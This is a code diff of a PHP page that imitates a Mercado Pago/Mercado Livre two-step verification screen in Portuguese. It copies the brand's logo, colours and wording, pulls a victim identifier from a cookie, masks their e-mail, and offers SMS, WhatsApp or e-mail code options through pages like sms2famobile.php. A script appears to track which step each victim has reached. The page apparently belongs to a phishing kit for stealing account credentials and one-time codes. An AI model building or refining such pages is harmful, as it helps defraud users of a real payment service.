@@ -24,11 +24,11 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
         if ($resultado) {
             $identificador_puro = $resultado['identificador'];
-            
+
             // Formata o label e define o tipo
             if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
                 $identificador_label = 'E-mail: ' . htmlspecialchars($identificador_puro);
-                
+
                 // Lógica para mascarar E-MAIL no formato 'niv***@gmail.com'
                 $partes_email = explode('@', $identificador_puro);
                 if (count($partes_email) === 2) {
@@ -60,7 +60,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Escolha um método de verificação para confirmar que a conta pertence a você</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --andes-color-yellow-500: #ffe600;
@@ -75,17 +75,17 @@ if (isset($_COOKIE['identificador_cliente'])) {
         .main-header { background-color: var(--andes-color-yellow-500); padding: 12px 24px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; box-sizing: border-box; display: flex; align-items: center; }
         .main-header img { height: 32px; }
         .main-content { padding: 24px; background-color: var(--andes-background-color-primary); flex-grow: 1; display: flex; flex-direction: column; }
-        
+
         .user-identifier-box { display: flex; align-items: center; gap: 12px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; width: fit-content; margin-bottom: 24px; }
         .icon-wrapper { width: 32px; height: 32px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; }
         .user-identifier-box .icon-wrapper svg { color: var(--andes-color-blue-500); }
         .identifier-text-block { display: flex; flex-direction: column; }
         .identifier-text-block .cpf-text { font-size: 14px; font-weight: 400; color: var(--andes-text-color-primary); }
         .identifier-text-block .change-account-link { font-size: 13px; color: var(--andes-text-color-link); text-decoration: none; margin-top: 2px; }
-        
+
         .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
         .main-title { font-size: 26px; font-weight: 600; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0 0 24px 0; }
-        
+
         .verification-card { box-sizing: border-box; }
         .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 0; text-decoration: none; color: inherit; }
         .verification-option .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
@@ -97,7 +97,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
         .verification-option .text-content p { margin: 0; font-size: 14px; color: var(--andes-text-color-secondary); }
         .verification-option .chevron-icon { margin-left: auto; }
         .verification-option .chevron-icon polyline { stroke: var(--andes-color-blue-500); }
-        
+
         .final-separator { height: 1px; background-color: var(--andes-border-color-secondary); margin: 16px 0; }
         .cant-login-link { display: block; text-align: center; color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; padding: 16px 0; }
         .help-link { display: block; margin-top: auto; padding-top: 32px; text-align: center; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
@@ -122,7 +122,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
         <span class="session-start-label">VERIFICAÇÃO EM 2 ETAPAS</span>
         <h1 class="main-title">Escolha um método de verificação para confirmar que a conta pertence a você</h1>
-        
+
         <div class="verification-card">
                 <a href="sms2famobile.php" class="verification-option">
                      <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="21" viewBox="0 0 20 21" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M5.50006 7.30047H14.5001V5.50047H5.50006V7.30047Z"></path><path d="M10.8986 10.9001H5.50006V9.10007H10.8986V10.9001Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.101562 13.5995C0.101562 15.0906 1.31039 16.2995 2.80156 16.2995H9.72759L16.3001 20.6806V16.2995H17.1986C18.6897 16.2995 19.8986 15.0906 19.8986 13.5995V2.80107C19.8986 1.30991 18.6897 0.101074 17.1986 0.101074H2.80156C1.31039 0.101074 0.101562 1.30991 0.101562 2.80107V13.5995ZM17.1986 14.4995H14.5001V17.3175L10.2725 14.4995H2.80156C2.30451 14.4995 1.90156 14.0965 1.90156 13.5995V2.80107C1.90156 2.30402 2.30451 1.90107 2.80156 1.90107H17.1986C17.6956 1.90107 18.0986 2.30402 18.0986 2.80107V13.5995C18.0986 14.0965 17.6956 14.4995 17.1986 14.4995Z"></path></svg></div>
@@ -135,7 +135,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
                     <div class="text-content"><h3>WhatsApp</h3><p>Vamos enviar um código para o telefone terminado em ****.</p></div>
                     <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                 </a>
-                
+
                 <a href="email2famobile.php" class="verification-option">
                     <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="14" viewBox="0 0 24 14" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.75 0.25H23.25V13.75H0.75V0.25ZM2.25 3.79417V12.25H21.75V3.79417L13.8601 8.30121C12.7074 8.95964 11.2926 8.95964 10.1399 8.30121L2.25 3.79417ZM2.25 2.06669L10.884 6.99874C11.5755 7.39379 12.4245 7.39379 13.116 6.99874L21.75 2.06669V1.75H2.25V2.06669Z"></path></svg></div>
                     <div class="text-content"><h3>E-mail</h3><p>Vamos enviar um código para <?php echo $email_mascarado; ?>.</p></div>
@@ -143,7 +143,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
                 </a>
 
                 <div class="final-separator"></div>
-                
+
                 <a href="https://www.mercadopago.com.br/account-recovery/landing-page?callback=https%3A%2F%2Fwww.mercadolivre.com%2Fjms%2Fmlb%2Flgz%2Fmsl%2Flogin%2FH4sIAAAAAAAEAy1P2w6CMAz9lz0bwHvg0R9ZCpTZuLFlKw5j_Hc79PGcnlvfynpDs-ZXQNUpXIOlgVjtVLDAk49O0ygHF4RKxPiHti8SiOCQMSbVvUuQwfGGYipRHBcUDSx815P1WaitSjhKGlexzWB1xv5JWK4T2FQcxgu4M4fU1XXOuXIYBxh9AOOrwbuqj7XIIhpKEoJl3lb22UlGYs0RhofqCif9oXwETH7-Tb-c2vNhf2zatjldzlf1-QLy-mEhAwEAAA%2Fsfa_removal%2Fcallback%3Fdps%3Darmor.26fffe04d42d6e334d245750e2be1f8563da232381384b96c08a7c0f0c67185eb2c7c4a614f5f3279aeea54552a2f88c5819aa3720ab720a18c5e3fe6690abbec651fb16a6a8816317b21d773163d163fcd3ded440ef946cd7c9957f4e3fcc32.fbb6183e18d9eba0900a8ec20ff7d912%26rbms%3D&on_hold_delay=24&recovery_type=CHANGE_EMAIL&transaction_id=aPsEtzPIkxgHrqeP2RIaFCOA5k7VZLGN" class="cant-login-link">Não consigo iniciar sessão</a>
             </div>
         </div>
@@ -177,7 +177,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
